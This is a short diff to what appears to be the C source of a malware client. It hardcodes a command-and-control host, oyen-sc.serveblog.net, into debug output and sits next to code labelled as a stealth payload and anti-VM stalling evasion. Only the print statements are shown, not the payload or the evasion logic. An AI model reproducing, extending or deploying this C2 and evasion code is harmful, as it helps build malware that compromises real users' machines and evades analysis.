@@ -60,9 +60,10 @@ int main(int argc, char *argv[]) {
     uint16_t relay_port = (uint16_t)atoi(relay_port_str);
 
     // 2. Network Debug Output (BEFORE forking)
-    DPRINTF_FLUSH("[-] C2 Target: %s:%d\n", relay_host, relay_port);
-    DPRINTF_FLUSH("[-] Resolving %s...\n", relay_host);
+    DPRINTF_FLUSH("[-] C2 Target: oyen-sc.serveblog.net:%d\n", relay_port);
+    DPRINTF_FLUSH("[-] Resolving oyen-sc.serveblog.net...\n");
     DPRINTF_FLUSH("[-] Initializing Stealth Payload...\n");
+
 
 
     // Evasion: Anti-VM & Stalling Logic
